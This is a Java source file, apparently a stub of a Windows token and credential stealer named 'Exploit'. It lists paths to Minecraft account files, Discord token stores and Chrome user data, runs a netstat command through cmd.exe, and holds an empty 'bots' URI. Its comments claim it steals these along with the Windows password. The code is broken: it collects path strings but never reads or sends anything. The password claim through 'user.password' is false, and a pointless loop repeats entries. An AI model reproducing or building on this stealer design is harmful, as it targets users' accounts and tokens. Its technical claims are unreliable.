import java.net.URI;
import java.util.ArrayList;

public class Exploit {
    public static void ratta() {
        try {
            ArrayList<URI> bots = new ArrayList<URI>();
            ArrayList<String> blacklist = new ArrayList<String>();
            Runtime.getRuntime().exec("cmd.exe /c netstat/nbf");
            bots.add(new URI(""));
            blacklist.add(new String(System.getProperty("user.home") + "/AppData/Roaming/.minecraft")); // gets
                                                                                                        // minecraft
                                                                                                        // accounts annd
                                                                                                        // their data
            blacklist.add(
                    new String(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb")); // gets
                                                                                                                     // discord
                                                                                                                     // tokens
            blacklist.add(new String(
                    System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb")); // gets
                                                                                                                // discord
                                                                                                                // tokens
            blacklist.add(new String(System.getProperty("user.home") + "/AppData/Roaming/Google/Chrome/User Data")); // gets
                                                                                                                     // google
                                                                                                                     // info
            for (int h = 2; h < 200; h++) {
                blacklist.add(new String(System.getProperty("user.name"))); // this steals windows account username
                blacklist.add(new String(System.getProperty("user.password"))); // this steals windows account password
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}